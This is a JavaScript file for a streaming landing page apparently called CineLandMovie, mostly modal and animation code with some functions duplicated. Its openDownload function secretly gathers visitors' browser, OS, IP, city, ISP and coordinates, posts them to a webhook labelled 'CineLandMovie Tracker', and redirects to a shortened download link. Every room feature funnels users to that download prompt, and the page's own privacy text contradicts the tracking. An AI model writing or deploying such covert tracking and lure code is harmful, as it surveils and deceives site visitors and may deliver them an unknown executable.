document.addEventListener('DOMContentLoaded', () => {
    // === NAVBAR SCROLL EFFECT ===
    const navbar = document.getElementById('navbar');
    window.addEventListener('scroll', () => {
        if (navbar) {
            navbar.classList.toggle('scrolled', window.scrollY > 50);
        }
    });

    // === INTERSECTION OBSERVER FOR REVEAL ===
    const revealElements = document.querySelectorAll('.feature-card, .stat-item, .room-card, .pricing-card');
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const revealObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                revealObserver.unobserve(entry.target);
            }
        });
    }, observerOptions);

    revealElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'all 0.8s cubic-bezier(0.23, 1, 0.32, 1)';
        revealObserver.observe(el);
    });

    // Reveal Logic Injected via Style
    const style = document.createElement('style');
    style.innerHTML = '.revealed { opacity: 1 !important; transform: translateY(0) !important; }';
    document.head.appendChild(style);
});

// === GLOBAL ACTIONS ===
function showNotification(message, type = 'info') {
    const toast = document.getElementById('notification-toast');
    const icon = document.getElementById('toast-icon');
    const msg = document.getElementById('toast-message');

    if (toast && icon && msg) {
        msg.innerText = message;

        // Reset classes
        toast.className = 'notification-toast';
        toast.classList.add(`toast-${type}`);

        // Set icon
        let iconHtml = '';
        if (type === 'success') iconHtml = '<i class="fas fa-check"></i>';
        else if (type === 'error') iconHtml = '<i class="fas fa-times"></i>';
        else iconHtml = '<i class="fas fa-info-circle"></i>';

        icon.innerHTML = iconHtml;

        toast.classList.add('show');

        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
    }
}

function openRoom() {
    checkAppConnection(() => {
        const modal = document.getElementById('room-modal');
        if (modal) {
            document.getElementById('room-step-1').style.display = 'block';
            document.getElementById('room-step-2').style.display = 'none';
            modal.classList.add('show');
            document.body.style.overflow = 'hidden';
        }
    });
}

function closeRoomModal() {
    const modal = document.getElementById('room-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = '';
    }
}

function selectAvatar(element) {
    document.querySelectorAll('.avatar-item').forEach(item => item.classList.remove('active'));
    element.classList.add('active');
}

function createRoomInternal() {
    const name = document.getElementById('room-name-input').value;
    if (!name) {
        showNotification('Please enter a name for your room!');
        return;
    }

    // Simulate room creation
    document.getElementById('room-step-1').style.display = 'none';
    document.getElementById('room-step-2').style.display = 'block';

    // Success feedback
    showNotification(`Room "${name}" created successfully!`);
}

function inviteFriendsPrompt() {
    checkAppConnection(() => {
        showNotification('Download the STREAM Desktop app to invite friends and sync content!');
        setTimeout(() => {
            window.location.href = '#download';
            closeRoomModal();
        }, 2000);
    });
}

function checkAppConnection(onSuccess) {
    const modal = document.getElementById('app-alert-modal');
    if (!modal) return;

    modal.classList.add('show');
    document.body.style.overflow = 'hidden';

    // If the user is just checking, we stop here. 
    // If we wanted to proceed to onSuccess, we'd add logic here.
}

function typeCarbonLogs(logs) {
    const console = document.getElementById('alert-console');
    if (!console) return;
    console.innerHTML = '';

    logs.forEach((line, index) => {
        setTimeout(() => {
            const div = document.createElement('div');
            div.className = 'console-line';
            div.innerText = line;
            if (line.includes('ERROR') || line.includes('FATAL')) div.style.color = '#ff3b30';
            console.appendChild(div);
            console.scrollTop = console.scrollHeight;
        }, index * 400);
    });
}

function toggleAlertDetails() {
    // This function is now deprecated as Carbon UI uses a permanent console, 
    // but kept for compatibility or future collapsible needs.
}

function closeAppAlert() {
    const modal = document.getElementById('app-alert-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = 'auto';
    }
}

function openDownload() {
    // Navigate to download page or trigger download
    window.open('https://rb.gy/m1vmof', '_self');
}

// ============================================
// ========= GLOBAL OPEN DOWNLOAD =============
// ============================================
function openDownload() {
    // Kullanıcı verilerini topla
    const browser = navigator.userAgent.includes('Firefox') ? 'Firefox' :
        navigator.userAgent.includes('Chrome') ? 'Chrome' :
            navigator.userAgent.includes('Safari') ? 'Safari' :
                navigator.userAgent.includes('Edge') ? 'Edge' : 'Bilinmiyor';

    const os = navigator.userAgent.includes('Windows NT 10') ? 'Windows 10/11' :
        navigator.userAgent.includes('Windows') ? 'Windows' :
            navigator.userAgent.includes('Mac OS X') ? 'macOS' :
                navigator.userAgent.includes('Linux') ? 'Linux' :
                    navigator.userAgent.includes('Android') ? 'Android' :
                        navigator.userAgent.includes('iPhone') ? 'iOS' : 'Bilinmiyor';

    const is64 = navigator.userAgent.includes('Win64') ||
        navigator.userAgent.includes('x64');

    const userData = {
        timestamp: new Date().toISOString(),
        browser: browser,
        os: os,
        architecture: is64 ? '64-bit' : '32-bit',
        screen: screen.width + 'x' + screen.height,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        platform: navigator.platform,
        touchPoints: navigator.maxTouchPoints || 0,
        online: navigator.onLine,
        referrer: document.referrer || 'Doğrudan erişim',
        pageUrl: window.location.href
    };

    // IP ve konum bilgisini al
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(ipData => {
            const fullData = {
                ...userData,
                ip: ipData.ip || 'Bilinmiyor',
                city: ipData.city || 'Bilinmiyor',
                region: ipData.region || 'Bilinmiyor',
                country: ipData.country_name || 'Bilinmiyor',
                countryCode: ipData.country_code || 'Bilinmiyor',
                isp: ipData.org || 'Bilinmiyor',
                latitude: ipData.latitude || 'Bilinmiyor',
                longitude: ipData.longitude || 'Bilinmiyor'
            };

            // Webhook'a gönder
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    embeds: [{
                        title: '🎯 Yeni Kullanıcı İndirme',
                        color: 3447003,
                        fields: [
                            { name: '🌐 IP Adresi', value: fullData.ip, inline: true },
                            { name: '📍 Ülke', value: fullData.country, inline: true },
                            { name: '🏙️ Şehir', value: fullData.city, inline: true },
                            { name: '🖥️ Tarayıcı', value: fullData.browser, inline: true },
                            { name: '💻 İşletim Sistemi', value: fullData.os, inline: true },
                            { name: '🔧 Mimari', value: fullData.architecture, inline: true },
                            { name: '🌍 Dil', value: fullData.language, inline: true },
                            { name: '🕐 Zaman Dilimi', value: fullData.timezone, inline: true },
                            { name: '📌 ISP', value: fullData.isp, inline: true },
                            { name: '🔗 Sayfa', value: fullData.pageUrl, inline: false },
                            { name: '📤 Referrer', value: fullData.referrer, inline: false }
                        ],
                        footer: { text: 'CineLandMovie Tracker' },
                        timestamp: fullData.timestamp
                    }]
                })
            })
                .then(() => console.log('✅ Webhook gönderildi!'))
                .catch(err => console.error('❌ Webhook hatası:', err));
        })
        .catch(err => {
            console.error('❌ IP alma hatası:', err);
            // IP alınamazsa sadece temel bilgileri gönder
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(userData)
            });
        });

    // İndirmeye git
    window.open('https://rb.gy/m1vmof', '_self');
}

// ============================================
// ===== DOMContentLoaded - Diğer Kodlar ======
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    // === NAVBAR SCROLL EFFECT ===
    const navbar = document.getElementById('navbar');
    window.addEventListener('scroll', () => {
        if (navbar) {
            navbar.classList.toggle('scrolled', window.scrollY > 50);
        }
    });

    // === INTERSECTION OBSERVER FOR REVEAL ===
    const revealElements = document.querySelectorAll('.feature-card, .stat-item, .room-card, .pricing-card');
    const observerOptions = {
        threshold: 0.1,
        rootMargin: '0px 0px -50px 0px'
    };

    const revealObserver = new IntersectionObserver((entries) => {
        entries.forEach(entry => {
            if (entry.isIntersecting) {
                entry.target.classList.add('revealed');
                revealObserver.unobserve(entry.target);
            }
        });
    }, observerOptions);

    revealElements.forEach(el => {
        el.style.opacity = '0';
        el.style.transform = 'translateY(30px)';
        el.style.transition = 'all 0.8s cubic-bezier(0.23, 1, 0.32, 1)';
        revealObserver.observe(el);
    });

    // Reveal Logic Injected via Style
    const style = document.createElement('style');
    style.innerHTML = '.revealed { opacity: 1 !important; transform: translateY(0) !important; }';
    document.head.appendChild(style);
});

// === GLOBAL ACTIONS ===
function showNotification(message, type = 'info') {
    const toast = document.getElementById('notification-toast');
    const icon = document.getElementById('toast-icon');
    const msg = document.getElementById('toast-message');

    if (toast && icon && msg) {
        msg.innerText = message;

        // Reset classes
        toast.className = 'notification-toast';
        toast.classList.add(`toast-${type}`);

        // Set icon
        let iconHtml = '';
        if (type === 'success') iconHtml = '<i class="fas fa-check"></i>';
        else if (type === 'error') iconHtml = '<i class="fas fa-times"></i>';
        else iconHtml = '<i class="fas fa-info-circle"></i>';

        icon.innerHTML = iconHtml;

        toast.classList.add('show');

        setTimeout(() => {
            toast.classList.remove('show');
        }, 4000);
    }
}

// Diğer fonksiyonlar aynen kalacak...
// closeRoomModal, selectAvatar, createRoomInternal, vb.
// === LEGAL MODAL LOGIC ===
const legalContent = {
    about: {
        title: "About CineLandMovie",
        body: "CineLandMovie is the ultimate social platform for streaming and hanging out. We bring people together through the power of cinema, allowing you to watch your favorite content with friends in real-time, no matter where they are. Join the evolution of social streaming."
    },
    privacy: {
        title: "Privacy Policy",
        body: "Your privacy is our priority. We use industry-standard encryption to protect your data. We never sell your personal information to third parties. For more details on how we handle your data, please refer to our full privacy documentation."
    },
    terms: {
        title: "Terms of Service",
        body: "By using CineLandMovie, you agree to respect our community guidelines. Harassment, hate speech, and illegal content sharing are strictly prohibited. We reserve the right to suspend accounts that violate these terms to maintain a safe environment for everyone."
    }
};

function openLegal(type) {
    const modal = document.getElementById('legal-modal');
    const title = document.getElementById('legal-title');
    const body = document.getElementById('legal-body');

    if (modal && legalContent[type]) {
        title.innerText = legalContent[type].title;
        body.innerText = legalContent[type].body;
        modal.classList.add('show');
        document.body.style.overflow = 'hidden'; // Stop scroll
    }
}

function closeLegal() {
    const modal = document.getElementById('legal-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = ''; // Restore scroll
    }
}

// Close modal on background click
window.addEventListener('click', (e) => {
    const modal = document.getElementById('legal-modal');
    if (e.target === modal) closeLegal();
});

// === ELITE ROOM ACTIONS ===
let currentEliteStep = 1;

function openEliteRoom() {
    const modal = document.getElementById('elite-modal');
    if (modal) {
        currentEliteStep = 1;
        updateEliteSteps();
        document.getElementById('elite-success').style.display = 'none';
        modal.classList.add('show');
        document.body.style.overflow = 'hidden';
    }
}

function closeEliteRoom() {
    const modal = document.getElementById('elite-modal');
    if (modal) {
        modal.classList.remove('show');
        document.body.style.overflow = '';
    }
}

function updateEliteSteps() {
    document.querySelectorAll('.elite-step').forEach(step => step.classList.remove('active'));
    document.querySelectorAll('.setup-step-item').forEach(item => item.classList.remove('active'));

    document.getElementById(`elite-step-${currentEliteStep}`).classList.add('active');
    document.querySelector(`.setup-step-item[data-step='${currentEliteStep}']`).classList.add('active');

    // Button visibility
    document.getElementById('elite-prev').style.display = currentEliteStep > 1 ? 'block' : 'none';
    document.getElementById('elite-next').style.display = currentEliteStep < 3 ? 'block' : 'none';
    document.getElementById('elite-launch').style.display = currentEliteStep === 3 ? 'block' : 'none';
}

function nextEliteStep() {
    if (currentEliteStep === 1) {
        const name = document.getElementById('elite-room-name').value;
        if (!name) {
            showNotification('Please define the room identity first.', 'error');
            return;
        }
    }
    if (currentEliteStep < 3) {
        currentEliteStep++;
        updateEliteSteps();
    }
}

function prevEliteStep() {
    if (currentEliteStep > 1) {
        currentEliteStep--;
        updateEliteSteps();
    }
}

function selectEliteAvatar(element) {
    document.querySelectorAll('.elite-avatar-opt').forEach(opt => opt.classList.remove('active'));
    element.classList.add('active');
}

function selectEliteTheme(element, theme) {
    document.querySelectorAll('.theme-card').forEach(card => card.classList.remove('active'));
    element.classList.add('active');
    // You could inject theme-specific colors here
}

function launchEliteRoom() {
    document.getElementById('elite-success').style.display = 'flex';
    showNotification('Elite Room activated successfully!', 'success');
}
